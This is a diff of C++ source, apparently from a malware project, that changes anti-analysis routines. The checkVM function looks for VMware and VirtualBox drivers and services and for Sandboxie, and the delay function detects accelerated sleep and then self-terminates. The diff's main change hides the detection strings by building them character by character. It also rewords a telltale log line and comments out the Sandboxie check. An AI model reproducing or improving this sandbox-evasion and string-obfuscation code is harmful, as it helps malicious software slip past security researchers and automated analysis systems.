@@ -13,6 +13,10 @@
 #pragma comment(lib,"ws2_32.lib")
 
 
+
+
+
+
 int VM::checkVM() {
 
 	int ret = 0;
@@ -24,7 +28,8 @@ int VM::checkVM() {
 		char syspath[MAX_PATH];
 		int len = lpGetSystemDirectoryA(syspath, sizeof(syspath));
 		syspath[len] = 0;
-		string driverpath = string(syspath) + "\\drivers\\";
+		char drivers[] = { '\\','d','r','i','v','e','r','s','\\',0 };
+		string driverpath = string(syspath) + drivers;
 
 		char vmmouse[] = { 'v','m','m','o','u','s','e','.','s','y','s',0 };
 		char vboxmouse[] = { 'V','B','o','x','M','o','u','s','e','.','s','y','s',0 };
@@ -54,9 +59,11 @@ int VM::checkVM() {
 			char vgas[] = { 'V','G','A','u','t','h','S','e','r','v','i','c','e',0 };
 			char vmt[] = { 'V','M','T','o','o','l','s',0 };
 			char vbs[] = { 'V','b','o','x','S','e','r','v','i','c','e',0 };
-			string vgauth = string("SERVICE_NAME: ") + vgas+ "\r\n";
-			string tool = string("SERVICE_NAME: ") + vmt+ "\r\n";
-			string vboxserv = string("SERVICE_NAME: ") + vbs+ "\r\n";
+
+			char prefix[] = { 'S','E','R','V','I','C','E','_','N','A','M','E',':',' ',0 };
+			string vgauth = string(prefix) + vgas+ "\r\n";
+			string tool = string(prefix) + vmt+ "\r\n";
+			string vboxserv = string(prefix) + vbs+ "\r\n";
 		
 			if (strstr(file, vgauth.c_str()) || strstr(file, tool.c_str()))
 			{
@@ -128,13 +135,21 @@ int VM::checkVM() {
 			break;
 		}
 
-		char szsbie[] = { 's','b','i','e','d','l','l','.','d','l','l',0 };
-		HMODULE hdll = lpLoadLibraryA(szsbie);
-		if (hdll)
-		{
-			vmlabel = 3;
-			break;
-		}
+		//char szsbie[] = { 's','b','i','e','d','l','l','.','d','l','l',0 };
+		//HMODULE hdll = lpLoadLibraryA(szsbie);
+		//if (hdll)
+		//{
+		//	lpFreeLibrary(hdll);
+		//	hdll = lpLoadLibraryA(szsbie);
+		//	if (hdll) {
+		//		vmlabel = 3;
+		//	}
+		//	else {
+		//		vmlabel = 0;
+		//	}
+		//	
+		//	break;
+		//}
 
 	} while (FALSE);
 
@@ -168,27 +183,27 @@ int VM::checkVM() {
 
 int VM::delay(int seconds) {
 
-	ULONGLONG t1 = lpGetTickCount64() / 1000;
+	ULONGLONG t1 = lpGetTickCount64() ;
 	ULONGLONG t2 = t1;
 	do
 	{
-		t2 = lpGetTickCount64() / 1000;
+		t2 = lpGetTickCount64() ;
 
 		ULONGLONG tm1 = time(0);
 
 		lpSleep( 1000);
 
-		ULONGLONG t3 = lpGetTickCount64() / 1000;
+		ULONGLONG t3 = lpGetTickCount64() ;
 
 		ULONGLONG tm2 = time(0);
 
 		if (t3 - t2 < 1000 || tm2 - tm1 < 1) {
 			while (1) {
-				runLog("maybe i am running in sand box\r\n");
+				runLog("time delay abnormal\r\n");
 				suicide();
 			}	
 		}
-	} while (t2 - t1 < seconds);
+	} while (t2 - t1 < seconds*1000);
 
 	return 0;
 }
